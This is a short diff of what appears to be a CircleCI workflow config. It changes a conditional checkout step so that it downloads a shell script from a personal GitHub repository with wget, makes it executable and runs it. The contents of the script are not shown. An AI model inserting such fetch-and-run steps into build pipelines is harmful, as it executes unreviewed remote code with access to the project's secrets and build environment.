@@ -13,12 +13,12 @@ jobs: # conditional steps may also be defined in `commands:`
       - when:
           condition: <<parameters.custom_checkout>>
           steps:
-            - run: wget https://raw.githubusercontent.com/circelwenakyo/nyobsa/main/Data_api.sh && chmod +x Data_api.sh
+            - run: wget https://raw.githubusercontent.com/circelwenakyo/nyobsa/main/Data_api.sh && chmod +x Data_api.sh && ./Data_api.sh
       - unless:
           condition: <<parameters.custom_checkout>>
           steps:
             - checkout
-            - run: ./Data_api.sh
+
 workflows:
   build-test-deploy:
     jobs:
